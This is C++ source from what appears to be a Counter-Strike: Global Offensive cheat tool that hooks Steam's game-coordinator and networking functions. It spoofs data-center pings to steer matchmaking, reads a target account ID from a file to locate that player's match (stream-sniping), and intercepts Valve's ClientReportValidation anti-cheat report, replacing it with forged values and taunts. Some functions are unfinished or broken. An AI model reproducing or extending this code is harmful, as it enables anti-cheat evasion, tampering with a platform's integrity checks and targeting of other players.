 { "lux" ,  std::pair<std::string,int>{"Luxembourg (EU West)", 28} },
 { "mad" ,  std::pair<std::string,int>{"Madrid (EU South)", 29} },
 { "par" ,  std::pair<std::string,int>{"Paris (EU West)", 30} },
 { "sto2",  std::pair<std::string,int>{"Stockholm (Bromma) (EU North)", 31} },
 { "sto" ,  std::pair<std::string,int>{"Stockholm (Kista) (EU North)", 32} },
 { "vie" ,  std::pair<std::string,int>{"Vienna (EU Central)", 33} },
 { "waw" ,  std::pair<std::string,int>{"Warsaw (EU Central)", 34} },
 { "atl" ,  std::pair<std::string,int>{"Atlanta (US East)", 35} },
 { "ord" ,  std::pair<std::string,int>{"Chicago (US Central)", 36} },
 { "lax" ,  std::pair<std::string,int>{"Los Angeles (US West)", 37} },
 { "eat" ,  std::pair<std::string,int>{"Moses Lake 1 (US Central)", 38} },
 { "mwh" ,  std::pair<std::string,int>{"Moses Lake 2 (US Central)", 39} },
 { "okc" ,  std::pair<std::string,int>{"Oklahoma City (US Central)", 40} },
 { "sea" ,  std::pair<std::string,int>{"Seattle (US North-West)", 41} },
 { "iad" ,  std::pair<std::string,int>{"Sterling (US East)", 42} },
 { "lim" ,  std::pair<std::string,int>{"Lima (SA West)", 43} },
 { "gru" ,  std::pair<std::string,int>{"Sao Paulo 1 (SA East)", 44} },
 { "ggru",  std::pair<std::string,int>{"Sao Paulo 2 (SA East)", 45} },
 { "scl" ,  std::pair<std::string,int>{"Santiago (SA South-West)", 46} },
 { "jnb" ,  std::pair<std::string,int>{"Johannesburg, South Africa (ZA)", 47}},
 { "pwz" , std::pair<std::string,int>{"Jiaxing, China (CN)", 48}},
 { "sof", std::pair<std::string,int>{"Argentinia", 49}},
 { "dfw", std::pair<std::string,int>{"DFW", 50}},
 { "eze", std::pair<std::string,int>{"EZE", 51}},
 { "shb" , std::pair<std::string,int>{"Unknown",52}},
};




#include "../../Config.h"

bool hk_SendDataOnSocket(uint32_t hSocket, void* pubData, uint32_t cubData, bool bReliable) {
	Debug::QuickPrint("Sending Data Out From SendDataOnSocket");


	bool status = hooks->steamNetworking.callOriginal<bool, 12>(hSocket, pubData, cubData, bReliable);
	return status;

}


int OurSteamWorks::hk_SendMessageToConnection(void* ecx, void* edx, uint32_t hConn, const void* pData, uint32_t cbData, int nSendFlags, int64_t* pOutMessageNumber) {

	Debug::QuickPrint("in steam networking sockets SendMessageToConnection!");
	int status = static_cast<EGCResults>(hooks->steamNetworkingSockets.callOriginal<int, 12>(hConn,pData,cbData,nSendFlags,pOutMessageNumber));

	return status;
}





int OurSteamWorks::RegionPicker(Param Params) {
	
	const auto type = Params.unMsgType & 0x7FFFFFFF;
	// aka 9103

	if (type == k_EMsgGCCStrike15_v2_MatchmakingClient2ServerPing) {


		CMsgGCCStrike15_v2_MatchmakingClient2ServerPing message;
		// + 8 to skip the header
		if (message.ParseFromArray((void*)(((std::uintptr_t)Params.pubData) + 8), Params.cubData - 8)) {
			for (auto i = 0; i < message.data_center_pings_size(); i++) {
				const auto datacenter = message.mutable_data_center_pings(i);

				// force shitty datacenters

				struct data_center {
					char a, b, c, d;
				};

				auto id = datacenter->data_center_id();

				data_center centerid = *reinterpret_cast<data_center*>(&id);

				char buffer[256];
				char string[4];



				
				int j = 0;

				if (centerid.d) {
					snprintf(string, 4, "%c%c%c%c", centerid.c, centerid.b, centerid.a, centerid.d);
				}
				else {
					snprintf(string, 4, "%c%c%c", centerid.c, centerid.b, centerid.a);
				}
				
				std::pair<std::string, int> OurCenter = RegionMap[std::string(string)];

				int spoof = config->RegionChanger.Regions[OurCenter.second] ? 15 : 999;


				if (centerid.d) {
					snprintf(buffer, 256, "Recieved Message for Datacenter %s (%c%c%c : %c)(%s) current ping is : %d spoofing to: %d", OurCenter.first.c_str(), centerid.c, centerid.b, centerid.a, centerid.d, string, datacenter->ping(), spoof);

				}
				else {
					snprintf(buffer, 256, "Recieved Message for Datacenter %s (%c%c%c)(%s)  current ping is : %d spoofing to: %d", OurCenter.first.c_str(), centerid.c, centerid.b, centerid.a, string, datacenter->ping(), spoof);

				}

				Debug::QuickPrint(buffer);

				if (datacenter->has_ping()) {
					//Debug::QuickPrint("Spoofing PING");
					datacenter->set_ping(spoof);
				}
			}

			const auto size = message.ByteSize() + 8;
			const auto buffer = new std::uint8_t[size];
			auto status = EGCResults{};

			// copy header
			std::memcpy(buffer, Params.pubData, 8);
			// serialize message
			if (message.SerializeToArray(buffer + 8, size - 8)) {
				Debug::QuickPrint("Writing Pings");
				status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, buffer, size));
			}
			else {
				Debug::QuickPrint("failed to serialize spoofed pings!");
				// let's not crash / not queue and send the original data
				status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, Params.pubData, Params.cubData));
			}

			delete[] buffer;

			return status;
		}

		std::puts("failed to parse CMsgGCCStrike15_v2_MatchmakingClient2ServerPing");
	}

	return hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, Params.pubData, Params.cubData);
}


#include "../../SDK/SDKAddition/Utils/PanksBigInteger.h"
static std::string ShareLinkEncode(uint64 matchId, uint64 reservationId, uint32 tvPort)
{
	//byte[] matchIdBytes = BitConverter.GetBytes(matchId);
	//byte[] reservationBytes = BitConverter.GetBytes(reservationId);
	// only the UInt16 low bits from the TV port are used
	uint16 tvPort16 = (unsigned short)(tvPort & ((1 << 16) - 1));
	//byte[] tvBytes = BitConverter.GetBytes(tvPort16);

	int nSharecodeSize = sizeof(uint64) + sizeof(uint64) + sizeof(uint32) + 1;
	std::byte* bytes = new std::byte[nSharecodeSize];
	ZeroMemory(bytes, nSharecodeSize);

	int nOffset = 1;
	std::memcpy(bytes + nOffset, &matchId, sizeof(uint64));
	//Buffer.BlockCopy(matchIdBytes, 0, bytes, 1, matchIdBytes.Length);
	nOffset += sizeof(uint64);
	std::memcpy(bytes + nOffset, &reservationId, sizeof(uint64));
	nOffset += sizeof(uint64);
	//Buffer.BlockCopy(reservationBytes, 0, bytes, 1 + matchIdBytes.Length, reservationBytes.Length);
	std::memcpy(bytes + nOffset, &tvPort16, sizeof(uint16));
	nOffset += sizeof(uint16);
	//Buffer.BlockCopy(tvBytes, 0, bytes, 1 + matchIdBytes.Length + reservationBytes.Length, tvBytes.Length);
	std::reverse(bytes, bytes + nOffset);

	std::string bytestr((char*)bytes);
	BigInteger big(bytestr);

	const char* charArray = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefhijkmnopqrstuvwxyz23456789";
	//sizeof(charArray);
	std::string c = "";

	//for (int i = 0; i < 25; i++)
	//{
	//	long long rem = (big % 57));
	//	c += charArray[(int)rem];
	//	bytes = big / 57;
	//}

	//return $"CSGO-{c.Substring(0, 5)}-{c.Substring(5, 5)}-{c.Substring(10, 5)}-{c.Substring(15, 5)}-{c.Substring(20, 5)}";

}

#include "../../EngineHooks.h"

#include "../../Resource/Protobuf/Headers/base_gcmessages.pb.h"
#include "../../Resource/Protobuf/Headers/gcsdk_gcmessages.pb.h"
#include "../../Resource/Protobuf/Headers/econ_gcmessages.pb.h"
#include "../../Resource/Protobuf/Headers/base_gcmessages.pb.h"
bool bHasSaved = false;
CMsgGCCStrike15_v2_WatchInfoUsers Saved;
CMsgGCCStrike15_v2_ClientRequestWatchInfoFriends SavedSend;
typedef char*(__thiscall* ConvertFunc)(void*, int16, int64, int64);

int __fastcall OurSteamWorks::hk_RetrieveMessage(void* ecx, void* edx, uint32_t* punMsgType, void* pubDest, uint32_t cubDest, uint32_t* pcubMsgSize) {

	const auto type = *punMsgType & 0x7FFFFFFF;

	// k_EMsgGCCStrike15_v2_WatchInfoUsers
	Debug::QuickPrint(("Message In From Steam Game Coordinator = " + std::to_string(type)).c_str());

	// 7856476




	switch (type)
	{
	case k_EMsgGCCStrike15_v2_ServerVarValueNotificationInfo:
		DumpProtobufMessage<CMsgGCCStrike15_v2_ServerVarValueNotificationInfo>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
	case k_EMsgGCCStrike15_v2_ClientVarValueNotificationInfo:
		DumpProtobufMessage<CMsgGCCStrike15_v2_ClientVarValueNotificationInfo>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
	case k_EMsgGCCStrike15_v2_ClientReportValidation:
		DumpProtobufMessage<CMsgGCCStrike15_v2_ClientReportValidation>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
	case k_EMsgGCCStrike15_v2_GC2ClientRequestValidation:
		DumpProtobufMessage<CMsgGCCStrike15_v2_GC2ClientRequestValidation>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
		break;
	case k_EMsgGCCStrike15_v2_GC2ClientRefuseSecureMode:
		DumpProtobufMessage<CMsgGCCStrike15_v2_GC2ClientRefuseSecureMode>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
		break;
	case k_EMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate:
		DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
		break;
	}

	
	



	if (type == k_EMsgGCCStrike15_v2_MatchmakingGC2ClientReserve)
	{
		CMsgGCCStrike15_v2_MatchmakingGC2ClientReserve message;
		message.ParsePartialFromArray((void*)((DWORD)pubDest + 8), *pcubMsgSize - 8);

		if (message.has_serverid() && message.has_server_address() && message.has_reservationid() && message.has_reservation())
		{
			std::string ourInfo{ "Server ID: " + std::to_string(message.serverid()) + " Server Address: " + message.server_address() + " Reservation ID:  " + std::to_string(message.reservationid()) };
			Debug::QuickPrint(ourInfo.c_str());
			g_OurServerReservation = message.reservationid();
		}
	}


	if (type == k_EMsgGCCStrike15_v2_MatchmakingServerReservationResponse) {
		memory->conColorMsg({ 255,255,0 }, "k_EMsgGCCStrike15_v2_MatchmakingServerReservationResponse Recieved From Valve Game-Coordinator\n");
		CMsgGCCStrike15_v2_MatchmakingServerReservationResponse ReservationResponse;
		ReservationResponse.ParsePartialFromArray((void*)((DWORD)pubDest + 8), *pcubMsgSize - 8);
		Debug::QuickPrint(ReservationResponse.DebugString().c_str());
		if (ReservationResponse.has_tv_info()) {
			memory->conColorMsg({ 255,255,0 }, "CMsgGCCStrike15_v2_MatchmakingServerReservationResponse Contains TV Info\n");
		}
	}



	int ret = 0;
	if (type == k_EMsgGCCStrike15_v2_WatchInfoUsers) {
		CMsgGCCStrike15_v2_WatchInfoUsers Info;

		Info.ParsePartialFromArray((void*)((DWORD)pubDest + 8), *pcubMsgSize - 8);
		Debug::QuickPrint(Info.DebugString().c_str());
#if 0
		if (bHasSaved) {
			//Saved.set_request_id(Info.request_id());
			//Saved.set_extended_timeout(Info.extended_timeout());

			//Debug::QuickPrint("Writing Saved Bullshit!");
			//const auto size = Saved.ByteSize() + 8;
			//const auto buffer = new std::uint8_t[size];
			//std::memcpy(buffer, pubDest, 8);
			//Saved.SerializeToArray(buffer + 8, size - 8);
		}
		else{
			Debug::QuickPrint("Saving WatchInfoUsers");
			if (Info.watchable_match_infos_size() > 0) {
				SavedSend.set_matchid(Info.watchable_match_infos().Get(0).match_id());
				SavedSend.set_serverid(Info.watchable_match_infos().Get(0).server_id());
			}
			Saved = Info;
			bHasSaved = true;
		}

		//Info.ParsePartialFromArray((void*)((DWORD)pubDest + 8), *pcubMsgSize - 8);

		//typedef void(__thiscall* handler)(void*, void*);
		//((handler)memory->WatchUserInfoProcess)((void*)memory->watchInfoGlobal, &Info);

		ret = hooks->gameCoordinator.callOriginal<int, 2>(punMsgType, pubDest, cubDest, pcubMsgSize);
		for (auto watchableInfo : Info.watchable_match_infos()) {
			g_StreamSniper.Info = watchableInfo;
			GOTVWaitFor = std::to_string(watchableInfo.server_id());
			Debug::QuickPrint(watchableInfo.DebugString().c_str());
		};
		return ret;
#endif
	}





	return hooks->gameCoordinator.callOriginal<int, 2>(punMsgType, pubDest, cubDest, pcubMsgSize);
}

#include <iostream>
#include <string>
#include <istream>
#include <sstream>
#include <iomanip>
template< typename T >
std::string int_to_hex(T i)
{
	std::stringstream stream;
	stream << std::string("0x").c_str()
		<< std::setfill('0') << std::setw(sizeof(T) * 2)
		<< std::hex << i;
	return stream.str();
}


int OurSteamWorks::SendAbandon() {
	CMsgGCCStrike15_v2_MatchmakingStop Message;
	Message.set_abandon(1);
	
	char buffer[2048];
	//int64_t val = 0x0000008e;

	int64_t val = 0;
	char* ptr = (char*)&val;
	*(int8_t*)ptr = (int8_t)-114;
	*(int8_t*)(ptr+ 1) = (int8_t)35;
	*(int8_t*)(ptr+3) = (int8_t)-128;

	memcpy(buffer, ptr, 8*sizeof(char));

	Message.SerializeToArray(buffer+8, 2048);

	EGCResults ret = (EGCResults)OurSteamWorks::hk_SendMessage(hooks->gameCoordinator.getThis(), 0, k_EMsgGCCStrike15_v2_MatchmakingStop | (1 << 31) , (void*)buffer, 8);
	if (ret == k_EGCResultInvalidMessage) {
		Debug::QuickPrint("The Message Was Marked As Invalid");
	}
	Debug::QuickPrint(std::to_string(ret).c_str());


	return 0;
}

#include <fstream>

std::ifstream playerFile;

#pragma pack(push, 1)
struct data_center {
	char a, b, c, d;
};
#pragma pack(pop)



void OurSteamWorks::ConnectToPlayersMatch() {
	static int nRequest{ 0 };
	nRequest++;
	if (nRequest > 1)
		return;
	playerFile.open("C:\\playersnipe.txt");
	char line[10];
	int32_t id = 0;
	std::string nasty;
	while (getline(playerFile, nasty)) {
		try {
			id = std::stoi(nasty);
			nasty.erase(std::remove(nasty.begin(), nasty.end(), '\n'),
				nasty.end());
			Debug::QuickPrint(("Our ID Is Now = " + std::to_string(id)).c_str());
			break;
		}
		catch (std::exception& e) {
			Debug::QuickPrint("Unable To Send!");
			Debug::QuickPrint(nasty.c_str());
		}
	}
	playerFile.close();
	Debug::QuickPrint(nasty.c_str());
	CMsgGCCStrike15_v2_ClientRequestWatchInfoFriends Message;

	//Message.set_account_ids(id);
	Message.add_account_ids(id); /* Set Account ID */
	Message.set_request_id(nRequest);

	int i = 0;
	struct data_center {
		char a, b, c, d;
	};

	for (auto Item : RegionMap) {
		DataCenterPing* newPing = Message.add_data_center_pings();
		data_center datacenter;
		int offset = 0;
		datacenter.c = *(char*)(Item.first.c_str());
		datacenter.b = *(char*)(Item.first.c_str() + sizeof(char));
		datacenter.a = *(char*)(Item.first.c_str() + (sizeof(char)*2));
		if (Item.first.size() >= 4) {
			datacenter.d = *(char*)(Item.first.c_str() + (sizeof(char) * 3));
		}
		int spoof = config->RegionChanger.Regions[Item.second.second] ? 15 : 300;
		newPing->set_data_center_id(*(uint32_t*)&datacenter);
		newPing->set_ping(15);
	}

	const auto size = Message.ByteSize() + 8;
	const auto buffer = new std::uint8_t[size];
	int64_t val = 0;
	char* ptr = (char*)&val;
	*(int8_t*)ptr = (int8_t)-78;
	*(int8_t*)(ptr + 1) = (int8_t)35;
	*(int8_t*)(ptr + 2) = (int8_t)0;
	*(int8_t*)(ptr + 3) = (int8_t)-128;
	std::memcpy(buffer, ptr, 8);
	Message.SerializeToArray(buffer + 8, size - 8);
	EGCResults ret = (EGCResults)OurSteamWorks::hk_SendMessage(hooks->gameCoordinator.getThis(), 0, k_EMsgGCCStrike15_v2_ClientRequestWatchInfoFriends2 | (1 << 31), (void*)buffer, size);
	if (ret == k_EGCResultInvalidMessage) {
		Debug::QuickPrint("The Message Was Marked As Invalid");
	}
	Debug::QuickPrint(std::to_string(ret).c_str());
	delete buffer;
}

bool bHasSavedSend = false;

int __fastcall OurSteamWorks::hk_SendMessage(void* ecx, void* edx, uint32_t unMsgType, const void* pubData, uint32_t cubData)
{
	const auto type = unMsgType & 0x7FFFFFFF;
	Debug::QuickPrint(("Message Out To Steam Game Coordinator = " + std::to_string(type)).c_str());
	Debug::QuickPrint(("Hex of cubData = " + int_to_hex(cubData)).c_str());
	Debug::QuickPrint(("Hex Of unMsgType = " + int_to_hex(unMsgType)).c_str());
	Debug::QuickPrint(("Hex Of type = " + int_to_hex(type)).c_str());

	if (type == k_EMsgGCCStrike15_v2_MatchmakingGC2ClientAbandon) {
		Debug::QuickPrint(("Abandon = " + std::to_string(type)).c_str());
	}

	switch (type)
	{
	case k_EMsgGCCStrike15_v2_ServerVarValueNotificationInfo:
		CON(DumpProtobufMessage<CMsgGCCStrike15_v2_ServerVarValueNotificationInfo>((char*)(((std::uintptr_t)pubData) + 8), (unsigned int)(cubData - 8)).c_str());
		break;
	case k_EMsgGCCStrike15_v2_ClientVarValueNotificationInfo:
		CON(DumpProtobufMessage<CMsgGCCStrike15_v2_ClientVarValueNotificationInfo>((char*)(((std::uintptr_t)pubData) + 8), (unsigned int)(cubData - 8)).c_str());
		break;
	case k_EMsgGCCStrike15_v2_ClientReportValidation:
	{
		{
			std::string MessageDebug = DumpProtobufMessage<CMsgGCCStrike15_v2_ClientReportValidation>((char*)(((std::uintptr_t)pubData) + 8), (unsigned int)(cubData - 8)).c_str();
			//_asm int 3
			//return 0;
			CMsgGCCStrike15_v2_ClientReportValidation ValvesBullshit;
			CMsgGCCStrike15_v2_ClientReportValidation OurFuckYouToValve;
			ValvesBullshit.ParseFromArray((char*)(((std::uintptr_t)pubData) + 8), (unsigned int)(cubData - 8));

			std::ofstream dumpfile("ClientReportValidationDump.txt", std::ios::out | std::ios::app);
			dumpfile << "\n\n ----  New Dump ---- \n\n";
			dumpfile << ValvesBullshit.DebugString();
			dumpfile.close();

			OurFuckYouToValve.set_file_report("Lol Get Fucked Fucko's");
			OurFuckYouToValve.set_command_line("\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Portal 2\\portal2.exe\" -steam -trusted -game dayofdefeat -language english");
			OurFuckYouToValve.set_total_files(UINT_MAX);
			OurFuckYouToValve.set_internal_error(0);
			OurFuckYouToValve.set_trust_time(0);
			OurFuckYouToValve.set_count_pending(0);
			OurFuckYouToValve.set_count_completed(ValvesBullshit.count_completed());
			OurFuckYouToValve.set_process_id(ValvesBullshit.process_id());
			OurFuckYouToValve.set_diagnostic1(UINT_MAX);
			OurFuckYouToValve.set_diagnostic2(UINT_MAX);
			OurFuckYouToValve.set_diagnostic3(UINT_MAX);
			OurFuckYouToValve.set_diagnostic4(UINT_MAX);
			OurFuckYouToValve.set_osversion(UINT_MAX);
			OurFuckYouToValve.set_clientreportversion(UINT_MAX);
			OurFuckYouToValve.set_last_launch_data("Come for me gaben, please. Im patching back in OBS GameCapture. Also to patch fake angles just animate only the last tick on the server bro.... come on.....");
			OurFuckYouToValve.set_report_count(UINT_MAX);
			const auto size = OurFuckYouToValve.ByteSize() + 8;
			const auto buffer = new std::uint8_t[size];
			auto status = EGCResults{};
			std::memcpy(buffer, pubData, 8);
			if (OurFuckYouToValve.SerializeToArray(buffer + 8, size - 8)) {
				Debug::QuickPrint("Writing ClientReportValidation");
				status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(unMsgType, buffer, size));
			}
			delete buffer;
			break;
		}
	}
	}



	unsigned char header[8];

	std::memcpy(header, pubData, 8);

	std::string strOut = "Pub Data Header = ";
	strOut.append(int_to_hex((int64_t)*header) + " ");
	for (int i = 0; i < 8; i++) {
		strOut.append(std::to_string((int8_t)(header[i])) + std::string(" "));
	}

	Debug::QuickPrint(strOut.c_str());
	Debug::QuickPrint(std::to_string((int64_t)*header).c_str());
	Debug::QuickPrint(std::string((const char*)header + '\0').c_str());


	Debug::QuickPrint(std::string("size of message = " + std::to_string(cubData)).c_str());


	if (type == k_EMsgGCCStrike15_v2_ClientRequestWatchInfoFriends2) {
		CMsgGCCStrike15_v2_ClientRequestWatchInfoFriends Message;
		//CMsgGCCStrike15_v2_MatchListRequestCurrentLiveGames Test;
		
		Message.ParseFromArray((void*)(((std::uintptr_t)pubData) + 8), cubData - 8);
#if 0
		if (bHasSavedSend) {
			//SavedSend.set_request_id(Message.request_id());
			for (int i = 0; i < Message.account_ids_size(); i++) {
				//SavedSend.set_account_ids(i, Message.account_ids().Get(i));
			}
			//SavedSend.set_serverid(Message.serverid());
			//Saved.set_request_id(SavedSend.request_id());
			Debug::QuickPrint("Writing Saved Bullshit!");
			const auto size = SavedSend.ByteSize() + 8;
			const auto buffer = new std::uint8_t[size];
			std::memcpy(buffer, pubData, 8);
			SavedSend.SerializeToArray(buffer + 8, size - 8);
		    return static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(unMsgType, buffer, size));
		}
		else {
			SavedSend = Message;
			bHasSavedSend = true;
		}
#endif



		Debug::QuickPrint("Client Request Watch Info Friends2");
		
		if (Message.has_client_launcher()) {
			Debug::QuickPrint("has_client_launcher()");
			Debug::QuickPrint(std::to_string(Message.client_launcher()).c_str());
		}

		if (Message.has_matchid()) {
			Debug::QuickPrint(".has_match()");
			Debug::QuickPrint(std::to_string(Message.matchid()).c_str());
		}

		if (Message.has_serverid()) {
			Debug::QuickPrint(".has_serverid()");
			Debug::QuickPrint(std::to_string(Message.serverid()).c_str());
		}

		if (Message.has_request_id()) {
			Debug::QuickPrint(".has_request_id()");
			Debug::QuickPrint(std::to_string(Message.request_id()).c_str());
		}

		for (auto id : Message.account_ids()) {
			Debug::QuickPrint(("Account ID = " + std::to_string(id)).c_str());
#if 0
			CMsgGCCStrike15_v2_ClientRequestWatchInfoFriends NewMessage;
			playerFile.open("C:\\playersnipe.txt");
			std::string nasty;

			//std::getline(playerFile, nasty);
			playerFile.close();
			int32_t id;
			nasty.erase(std::remove(nasty.begin(), nasty.end(), '\n'),
				nasty.end());
			try {
				id = std::stoi(nasty);
			}
			catch (std::exception& e) {
				Debug::QuickPrint("Unable To Send!");
				Debug::QuickPrint(nasty.c_str());
				return k_EGCResultInvalidMessage;
			}
			Debug::QuickPrint(nasty.c_str());
			NewMessage.add_account_ids(id);
			const auto size = Message.ByteSize() + 8;
			const auto buffer = new std::uint8_t[size];
			auto status = EGCResults{};
			// copy header
			std::memcpy(buffer, pubData, 8);
			// serialize message
			if (NewMessage.SerializeToArray(buffer + 8, size - 8)) {

				CMsgGCCStrike15_v2_ClientRequestWatchInfoFriends Message;
				Message.ParseFromArray((void*)(((std::uintptr_t)pubData) + 8), cubData - 8);
				Debug::QuickPrint("Client Request Watch Info Friends2 Spoof");
				for (auto id : Message.account_ids()) {
					Debug::QuickPrint(("Account ID Of Spoofed = " + std::to_string(id)).c_str());
				}
				Debug::QuickPrint("Writing Account ID");
				status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(unMsgType, buffer, size));
			}
			else {
				Debug::QuickPrint("failed to serialize Account ID!");
				// let's not crash / not queue and send the original data
				status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(unMsgType, pubData, cubData));
			}
			delete buffer;
#endif
			//return status;
		}


			for (auto i = 0; i < Message.data_center_pings_size(); i++) {
				const auto datacenter = Message.mutable_data_center_pings(i);

				// force shitty datacenters

				struct data_center {
					char a, b, c, d;
				};

				auto id = datacenter->data_center_id();

				data_center centerid = *reinterpret_cast<data_center*>(&id);

				char buffer[256];
				char string[4];




				int j = 0;

				if (centerid.d) {
					snprintf(string, 4, "%c%c%c%c", centerid.c, centerid.b, centerid.a, centerid.d);
				}
				else {
					snprintf(string, 4, "%c%c%c", centerid.c, centerid.b, centerid.a);
				}

				std::pair<std::string, int> OurCenter = RegionMap[std::string(string)];

				int spoof =  1;


				if (centerid.d) {
					snprintf(buffer, 256, "(WatchFriend) Sending Message for Datacenter %s (%c%c%c : %c)(%s) current ping is : %d spoofing to: %d", OurCenter.first.c_str(), centerid.c, centerid.b, centerid.a, centerid.d, string, datacenter->ping(), spoof);

				}
				else {
					snprintf(buffer, 256, "(WatchFriend) Sending Message for Datacenter %s (%c%c%c)(%s)  current ping is : %d spoofing to: %d", OurCenter.first.c_str(), centerid.c, centerid.b, centerid.a, string, datacenter->ping(), spoof);

				}





				Debug::QuickPrint(buffer);

				if (datacenter->has_ping()) {
					//Debug::QuickPrint("Spoofing PING");
					datacenter->set_ping(spoof);
				}






			}

	}

	


	//double* Header = (double*)pubData;



	Param Params;
	Params.ecx = ecx;
	Params.edx = edx;
	Params.unMsgType = unMsgType;
	Params.pubData = pubData;
	Params.cubData = cubData;
	
	//GCCStrike15_v2_MatchListRequestCurrentLiveGames
	/*
	
	enum ECsgoGCMsg : int {
  k_EMsgGCCStrike15_v2_Base = 9100,
  k_EMsgGCCStrike15_v2_MatchmakingStart = 9101,
  k_EMsgGCCStrike15_v2_MatchmakingStop = 9102,
  k_EMsgGCCStrike15_v2_MatchmakingClient2ServerPing = 9103,
  k_EMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate = 9104,
  k_EMsgGCCStrike15_v2_MatchmakingServerReservationResponse = 9106,
  k_EMsgGCCStrike15_v2_MatchmakingGC2ClientReserve = 9107,
  k_EMsgGCCStrike15_v2_MatchmakingClient2GCHello = 9109,
  k_EMsgGCCStrike15_v2_MatchmakingGC2ClientHello = 9110,
  k_EMsgGCCStrike15_v2_MatchmakingGC2ClientAbandon = 9112,
  k_EMsgGCCStrike15_v2_MatchmakingGCOperationalStats = 9115,
  k_EMsgGCCStrike15_v2_MatchmakingOperator2GCBlogUpdate = 9117,
  k_EMsgGCCStrike15_v2_ServerNotificationForUserPenalty = 9118,
  k_EMsgGCCStrike15_v2_ClientReportPlayer = 9119,
  k_EMsgGCCStrike15_v2_ClientReportServer = 9120,
  k_EMsgGCCStrike15_v2_ClientCommendPlayer = 9121,
  k_EMsgGCCStrike15_v2_ClientReportResponse = 9122,
  k_EMsgGCCStrike15_v2_ClientCommendPlayerQuery = 9123,
  k_EMsgGCCStrike15_v2_ClientCommendPlayerQueryResponse = 9124,
  k_EMsgGCCStrike15_v2_WatchInfoUsers = 9126,
  k_EMsgGCCStrike15_v2_ClientRequestPlayersProfile = 9127,
  k_EMsgGCCStrike15_v2_PlayersProfile = 9128,
  k_EMsgGCCStrike15_v2_PlayerOverwatchCaseUpdate = 9131,
  k_EMsgGCCStrike15_v2_PlayerOverwatchCaseAssignment = 9132,
  k_EMsgGCCStrike15_v2_PlayerOverwatchCaseStatus = 9133,
  k_EMsgGCCStrike15_v2_GC2ClientTextMsg = 9134,
  k_EMsgGCCStrike15_v2_Client2GCTextMsg = 9135,
  k_EMsgGCCStrike15_v2_MatchEndRunRewardDrops = 9136,
  k_EMsgGCCStrike15_v2_MatchEndRewardDropsNotification = 9137,
  k_EMsgGCCStrike15_v2_ClientRequestWatchInfoFriends2 = 9138,
  k_EMsgGCCStrike15_v2_MatchList = 9139,
  k_EMsgGCCStrike15_v2_MatchListRequestCurrentLiveGames = 9140,
  k_EMsgGCCStrike15_v2_MatchListRequestRecentUserGames = 9141,
  k_EMsgGCCStrike15_v2_GC2ServerReservationUpdate = 9142,
  k_EMsgGCCStrike15_v2_ClientVarValueNotificationInfo = 9144,
  k_EMsgGCCStrike15_v2_MatchListRequestTournamentGames = 9146,
  k_EMsgGCCStrike15_v2_MatchListRequestFullGameInfo = 9147,
  k_EMsgGCCStrike15_v2_GiftsLeaderboardRequest = 9148,
  k_EMsgGCCStrike15_v2_GiftsLeaderboardResponse = 9149,
  k_EMsgGCCStrike15_v2_ServerVarValueNotificationInfo = 9150,
  k_EMsgGCCStrike15_v2_ClientSubmitSurveyVote = 9152,
  k_EMsgGCCStrike15_v2_Server2GCClientValidate = 9153,
  k_EMsgGCCStrike15_v2_MatchListRequestLiveGameForUser = 9154,
  k_EMsgGCCStrike15_v2_Client2GCEconPreviewDataBlockRequest = 9156,
  k_EMsgGCCStrike15_v2_Client2GCEconPreviewDataBlockResponse = 9157,
  k_EMsgGCCStrike15_v2_AccountPrivacySettings = 9158,
  k_EMsgGCCStrike15_v2_SetMyActivityInfo = 9159,
  k_EMsgGCCStrike15_v2_MatchListRequestTournamentPredictions = 9160,
  k_EMsgGCCStrike15_v2_MatchListUploadTournamentPredictions = 9161,
  k_EMsgGCCStrike15_v2_DraftSummary = 9162,
  k_EMsgGCCStrike15_v2_ClientRequestJoinFriendData = 9163,
  k_EMsgGCCStrike15_v2_ClientRequestJoinServerData = 9164,
  k_EMsgGCCStrike15_v2_ClientRequestNewMission = 9165,
  k_EMsgGCCStrike15_v2_GC2ClientTournamentInfo = 9167,
  k_EMsgGC_GlobalGame_Subscribe = 9168,
  k_EMsgGC_GlobalGame_Unsubscribe = 9169,
  k_EMsgGC_GlobalGame_Play = 9170,
  k_EMsgGCCStrike15_v2_AcknowledgePenalty = 9171,
  k_EMsgGCCStrike15_v2_Client2GCRequestPrestigeCoin = 9172,
  k_EMsgGCCStrike15_v2_GC2ClientGlobalStats = 9173,
  k_EMsgGCCStrike15_v2_Client2GCStreamUnlock = 9174,
  k_EMsgGCCStrike15_v2_FantasyRequestClientData = 9175,
  k_EMsgGCCStrike15_v2_FantasyUpdateClientData = 9176,
  k_EMsgGCCStrike15_v2_GCToClientSteamdatagramTicket = 9177,
  k_EMsgGCCStrike15_v2_ClientToGCRequestTicket = 9178,
  k_EMsgGCCStrike15_v2_ClientToGCRequestElevate = 9179,
  k_EMsgGCCStrike15_v2_GlobalChat = 9180,
  k_EMsgGCCStrike15_v2_GlobalChat_Subscribe = 9181,
  k_EMsgGCCStrike15_v2_GlobalChat_Unsubscribe = 9182,
  k_EMsgGCCStrike15_v2_ClientAuthKeyCode = 9183,
  k_EMsgGCCStrike15_v2_GotvSyncPacket = 9184,
  k_EMsgGCCStrike15_v2_ClientPlayerDecalSign = 9185,
  k_EMsgGCCStrike15_v2_ClientLogonFatalError = 9187,
  k_EMsgGCCStrike15_v2_ClientPollState = 9188,
  k_EMsgGCCStrike15_v2_Party_Register = 9189,
  k_EMsgGCCStrike15_v2_Party_Unregister = 9190,
  k_EMsgGCCStrike15_v2_Party_Search = 9191,
